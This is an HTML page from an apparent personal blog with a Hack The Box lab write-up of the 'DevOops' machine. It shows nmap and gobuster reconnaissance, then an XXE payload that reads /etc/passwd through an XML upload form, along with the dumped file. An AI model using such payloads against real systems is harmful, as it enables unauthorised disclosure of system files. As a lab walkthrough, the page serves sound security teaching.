@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — DevOops&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — DevOops">
+  
+    <meta name="description" content="This is a really fun box that isn’t too difficult to solve. As the name implies, it involves exploiting common mistakes developers make, for both user and root. The funny thing is that the box creator also made one of these rookie devops mistakes, which introduced an unintended attack path and made the box a whole lot easier.">
+    <meta property="og:description" content="This is a really fun box that isn’t too difficult to solve. As the name implies, it involves exploiting common mistakes developers make, for both user and root. The funny thing is that the box creator also made one of these rookie devops mistakes, which introduced an unintended attack path and made the box a whole lot easier.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/c74d84352f781ad5c7a4c35c0c3aa0ac.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/c74d84352f781ad5c7a4c35c0c3aa0ac.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — DevOops</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Tue, Feb 13, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Medium">Medium</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/d5372a2355a0481f916c1cde5c84bf27" class="PageRoot"><h3 id="https://www.notion.so/9e2a2f6ec63348c69487e9fdadc9c170" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/9e2a2f6ec63348c69487e9fdadc9c170"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/94464c3f7ef04704883fb12b629690d2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This is a really fun box that isn’t too difficult to solve. As the name implies, it involves exploiting common mistakes developers make, for both user and root. The funny thing is that the box creator also made one of these rookie devops mistakes, which introduced an unintended attack path and made the box a whole lot easier.</span></span></p></div><div id="https://www.notion.so/c359cdfae5ee4d1a9043d15cc837d1b6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/78470ca62f0e49efab0232138dcf03d8" class="Divider"></div><h3 id="https://www.notion.so/0134777a736247609dcf51c60f6429cd" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/0134777a736247609dcf51c60f6429cd"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/538d5708b3a3446bb9b20d1db3eb1170" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/00c7343d549f49d7b217833d26ef74f2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.191.193
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 15:14 ACDT
+Nmap scan report for 10.129.191.193
+Host is up (0.34s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 69.95 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 22,5000 10.129.191.193
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 15:16 ACDT
+Nmap scan report for 10.129.191.193
+Host is up (0.34s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
+|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
+|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
+5000/tcp open  http    Gunicorn 19.7.1
+|_http-server-header: gunicorn/19.7.1
+|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 5.0 (94%), Linux 5.1 (93%), Linux 3.1 (92%), Linux 3.2 (92%), Linux 3.12 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 5000/tcp)
+HOP RTT       ADDRESS
+1   341.21 ms 10.10.14.1
+2   341.88 ms 10.129.191.193
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.86 seconds</span></span></span></code></pre><div id="https://www.notion.so/696fa063854941a8b6a38f047bcd322a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap found HTTP running on port 5000. Based on the webserver, I’m guessing it’s a Flask website.</span></span></p></div><div id="https://www.notion.so/c5120c8d05d047dcb68636eb5c5a29b9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/bfb9b42551a94a299be5c9f8b35cbd9a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP5000 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/9e9d09a02b574728a60b05df6d7e78d6" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F9375f20d-32ca-4b97-bdf2-98114623a284%2FUntitled.png?width=1472&amp;table=block&amp;id=9e9d09a0-2b57-4728-a60b-05df6d7e78d6"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F9375f20d-32ca-4b97-bdf2-98114623a284%2FUntitled.png?width=1472&amp;table=block&amp;id=9e9d09a0-2b57-4728-a60b-05df6d7e78d6" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/cad96bc36b6e4b97b2459d287fa06a9c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The home page shows an under-construction blog, with a few comments and a big screenshot. It mentions </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">feed.py</code></span><span class="SemanticString">, which might be the name of the page source.</span></span></p></div><pre id="https://www.notion.so/43f6a59a9d004ef89589a5d316bf7f0b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>HTTP/1.1 200 OK
+Server: gunicorn/19.7.1
+Date: Mon, 12 Feb 2024 04:49:33 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 285
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    Under construction!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is feed.py, which will become the MVP for Blogfeeder application.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>TODO: replace this with the proper feed from the dev.solita.fi backend.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/feed<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>60%<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>60%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/10f9f931cb014b36a8f15dd88f57f43a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/6976b26eae114cd194dc5f5676895e77" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">XML File Upload:</strong></span></span></p></div><pre id="https://www.notion.so/0f68834fa09a473b88d28bf666cdfdb4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u http://10.129.191.193:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.191.193:5000
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/upload               (Status: 200) [Size: 347]
+/feed                 (Status: 200) [Size: 546263]
+/newpost              (Status: 405) [Size: 178]</span></span></span></code></pre><div id="https://www.notion.so/5f42995fee374bd2936a39d9f0ef8d87" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Directory busting found 3 further endpoints. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/feed</code></span><span class="SemanticString"> is the image we saw earlier, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/newpost</code></span><span class="SemanticString"> likely only accepts POST requests, based on the 405 status. Without knowing much about the backend, I can’t do much with it.</span></span></p></div><div id="https://www.notion.so/1b16f67ffa7e4a28a94c817ba61466fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This leaves us with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/upload</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/f2d88b2971ff425b82b473e0ced657f4" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc0fab4c4-ae08-41ec-aecb-9a58ebc514a5%2FUntitled.png?width=755&amp;table=block&amp;id=f2d88b29-71ff-425b-82b4-73e0ced657f4"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc0fab4c4-ae08-41ec-aecb-9a58ebc514a5%2FUntitled.png?width=755&amp;table=block&amp;id=f2d88b29-71ff-425b-82b4-73e0ced657f4" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/f27ce36973ed41619a2141f8398dd13e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s an upload page for XML files, and the schema is also provided. I’ll upload a test XML file with the specified XML elements.</span></span></p></div><pre id="https://www.notion.so/6883c7532f2d45c5a22287f3bac3d486" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Post</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>ch3ng<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>DevOops<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span>ch3ng was here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Post</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/202e50d10d404198b37bf58ceab88951" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The web app simply parsed the XML and displayed its contents back to me. It also returned the web root, which is inside </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">roosa</code></span><span class="SemanticString">&#x27;s home directory.</span></span></p></div><div id="https://www.notion.so/17036dcea8c242adbdeaabd4ed55d60c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F25ad694a-3389-4ed8-9942-99dc67539eca%2FUntitled.png?width=1191&amp;table=block&amp;id=17036dce-a8c2-42ad-bdea-abd4ed55d60c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F25ad694a-3389-4ed8-9942-99dc67539eca%2FUntitled.png?width=1191&amp;table=block&amp;id=17036dce-a8c2-42ad-bdea-abd4ed55d60c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/4e134dc81a9340c9b0c0e5d96935dba1" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5b0c0204-eba5-484f-9636-4a86c004ee4a%2FUntitled.png?width=1444&amp;table=block&amp;id=4e134dc8-1a93-40c9-b0c0-e5d96935dba1"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5b0c0204-eba5-484f-9636-4a86c004ee4a%2FUntitled.png?width=1444&amp;table=block&amp;id=4e134dc8-1a93-40c9-b0c0-e5d96935dba1" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/858beaae5d534702977b1529aa648844" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I also tried uploading XML files that don’t follow the specified schema, as well as some </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.txt</code></span><span class="SemanticString"> files. Both resulted in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">500 Internal Server Error</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/439c481174f54d4c9e82c509c56476a7" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fddb1cf2f-8108-44f3-aecc-068fbcb4cc93%2FUntitled.png?width=784&amp;table=block&amp;id=439c4811-74f5-4d4c-9e82-c509c56476a7"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fddb1cf2f-8108-44f3-aecc-068fbcb4cc93%2FUntitled.png?width=784&amp;table=block&amp;id=439c4811-74f5-4d4c-9e82-c509c56476a7" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d789715197ea44a6bf06df9bfc6b0e1b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/d9110fe5516c4b2d90727e3f5f08a917" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">XXE Local File Disclosure:</strong></span></span></p></div><div id="https://www.notion.so/b21caa6f48de4d4b967af7e257c9fc29" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With XML uploads, it’s always worth testing for </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://portswigger.net/web-security/xxe">XML External Entity (XXE) Injection</a></span><span class="SemanticString">. This is a very common web vulnerability that arises from insecure XML parsing, and can result in local file disclosure, SSRF, or even RCE in some serious cases.</span></span></p></div><div id="https://www.notion.so/71a141894c2d4bb4ba2e7d4b39ca0368" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll upload the following XML file, which loads an external entity </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">filename</code></span><span class="SemanticString"> that contains a file path. If insecurely parsed, the entity would then be expanded to include the contents of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/passwd</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/bb1d9a0a61d74aab9b76607c7e203222" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">lfi</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY filename SYSTEM "/etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Post</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&filename;">&amp;filename;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Post</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/0fc95a6577bb419cbd68e9b08ccf8289" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As shown in the server response below, the entire passwd file is included under the “Author” section, confirming the vulnerability.</span></span></p></div><pre id="https://www.notion.so/a65e038facb444bbb5b0596a7b094d81" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>HTTP/1.1 200 OK
+Server: gunicorn/19.7.1
+Date: Mon, 12 Feb 2024 05:23:59 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 2577
+
+PROCESSED BLOGPOST: 
+Author: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false
+git:x:1001:1001:git,,,:/home/git:/bin/bash
+roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
+sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false
+
+ Subject: 
+ Content: 
+ URL for later reference: /uploads/test.xml
